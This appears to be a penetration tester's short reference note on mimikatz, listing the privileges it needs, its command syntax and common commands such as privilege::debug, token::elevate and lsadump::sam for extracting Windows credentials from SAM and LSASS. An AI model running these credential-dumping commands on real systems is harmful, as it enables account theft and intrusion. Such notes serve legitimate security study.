---
tags:
  - "#type/tool"
  - "#attack/credential-access"
Link: https://github.com/gentilkiwi/mimikatz/wiki
Purpose: gather credentials on windows
---
# Info

Extracts password, hashes, etc. from various sources on windows:

- SAM
- Memory of the LSASS

For fundamentals see [[2 Tech-Specifics/OS/Windows/Authentication Attacks Windows|Authentication Attacks Windows]]

**Required privileges:**
- Administrator
- SeDebugPrivilege

Alternatively, use the [Token Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-token#elevate) of mimikatz to elevate privileges.

# Usage

1. start mimikatz with `mimikatz.exe`
2. Use commands

**Hint:** Commands can also be supplied as arguments to the mimikatz command prompt

Commands within the mimikatz shell have the following format:

`<modulename>::<commandname> [arguments]`

e.g. `crypto::certificates /systemstore:local_machine /store:my /export`

Available modules: <https://github.com/gentilkiwi/mimikatz/wiki#modules>

Common commands:

| Command            | Purpose                     |
| ------------------ | --------------------------- |
| `privilege::debug` | enable debugging privileges |
| `token::elevate`   | elevate privileges          |
| `lsadump::sam`     | dump credentials form SAM   |
| `log <path>`       | write output too file       |

# Snippets
